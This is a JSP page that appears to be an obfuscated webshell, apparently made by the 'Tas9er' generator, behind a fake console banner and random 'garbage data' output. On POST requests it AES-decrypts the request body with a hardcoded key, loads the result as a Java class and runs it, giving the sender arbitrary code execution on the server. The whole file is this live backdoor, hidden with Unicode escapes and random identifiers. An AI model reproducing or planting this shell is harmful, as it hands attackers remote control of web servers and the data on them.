Hello Administrator!
WelCome To Tas9er Java Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
<%!
    class tas9er9Zz0y06tj extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
        tas9er9Zz0y06tj(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 tas9erkgJq81oCC) {
            super(tas9erkgJq81oCC);
        }
        public Class tas9erhSTWMXWSK(byte[] tas9ercDeR679Og) {
            return super.d\uuuuuuuuu0065fineClass(tas9ercDeR679Og,0,tas9ercDeR679Og.length);
        }
    }
%><%
    out.println("Random Garbage Data:");
    Random tas9erUQuMWO1Mp = new Random();
    int tas9erELoDXZMLy = tas9erUQuMWO1Mp.nextInt(1234);
    int tas9eroub8tzgMK = tas9erUQuMWO1Mp.nextInt(5678);
    int tas9erLSsOnKz7t = tas9erUQuMWO1Mp.nextInt(1357);
    int tas9erb7qoe9WnI = tas9erUQuMWO1Mp.nextInt(2468);
    out.println(tas9erELoDXZMLy+","+tas9eroub8tzgMK+","+tas9erLSsOnKz7t+","+tas9erb7qoe9WnI);
    String[] tas9ergQJRjYQUq = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
    String tas9erGsA0mJ6op = tas9ergQJRjYQUq[1] + tas9ergQJRjYQUq[3] + tas9ergQJRjYQUq[5] + tas9ergQJRjYQUq[7];
    if (request.getMethod().equals(tas9erGsA0mJ6op)) {
        String tas9erLOIUAe6WO = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer("MTZhY2FjYzA1YWFmYWY2Nw=="));
        session.setAttribute("u", tas9erLOIUAe6WO);
        Cipher tas9erjTAAK6j39 = Cipher.getInstance("AES");
        tas9erjTAAK6j39.init(((tas9erELoDXZMLy * tas9eroub8tzgMK + tas9erLSsOnKz7t - tas9erb7qoe9WnI) * 0) + 3 - 1, new SecretKeySpec(tas9erLOIUAe6WO.getBytes(), "AES"));
        new tas9er9Zz0y06tj(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).tas9erhSTWMXWSK(tas9erjTAAK6j39.doFinal(new sun.misc.B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
